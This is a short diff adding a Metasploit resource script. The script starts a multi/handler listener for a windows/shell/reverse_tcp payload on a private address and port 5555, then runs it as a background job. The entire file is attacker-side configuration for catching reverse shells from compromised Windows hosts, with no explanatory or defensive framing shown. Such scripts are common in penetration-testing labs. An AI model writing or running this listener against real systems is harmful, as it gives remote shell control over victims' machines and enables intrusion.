@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set payload windows/shell/reverse_tcp
+set lhost 192.168.121.174 
+set lport 5555
+run -j -z
